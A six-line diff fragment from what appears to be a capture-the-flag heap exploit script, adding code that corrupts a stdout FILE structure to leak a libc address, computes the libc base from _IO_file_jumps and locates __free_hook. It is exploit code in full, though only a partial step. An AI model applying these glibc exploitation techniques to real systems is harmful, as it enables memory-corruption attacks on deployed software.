@@ -1,0 +1,6 @@
+	#get stdout and leaklibc
+	add(size, p64(0xfbad1887) + p64(0)*3 + '\x00')    #this chunk begins at stdout
+	leak = p.recv(0x60)
+	io_file_jumps = u64(leak[-8:])
+	libc.address = io_file_jumps - libc.symbols['_IO_file_jumps']
+	__free_hook = libc.symbols['__free_hook']
